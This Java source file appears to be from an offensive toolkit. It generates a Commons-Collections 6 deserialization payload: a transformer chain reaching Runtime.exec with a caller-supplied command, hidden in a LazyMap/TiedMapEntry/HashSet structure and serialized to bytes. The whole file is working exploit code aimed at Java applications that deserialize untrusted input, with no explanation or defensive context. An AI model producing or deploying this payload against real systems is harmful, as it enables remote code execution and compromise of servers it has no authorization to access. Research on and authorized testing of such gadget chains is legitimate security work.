package top.racerz.payload;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CC6 {
    public static byte[] getPayload(String command) throws Exception {
        ChainedTransformer fake = new ChainedTransformer(new Transformer[]{});
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, new Object[]{command})
        };

        HashMap map = new HashMap();
        Map innerMap = LazyMap.decorate(map, fake);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, "key");

        HashSet hashSet = new HashSet(1);
        hashSet.add(tiedMapEntry);
        // LazyMap#get -> 判断key是否包含
        innerMap.remove("key");

        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(fake, transformers);

        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        ObjectOutputStream outputStream = new ObjectOutputStream(bout);
        outputStream.writeObject(hashSet);

        return bout.toByteArray();
    }
}

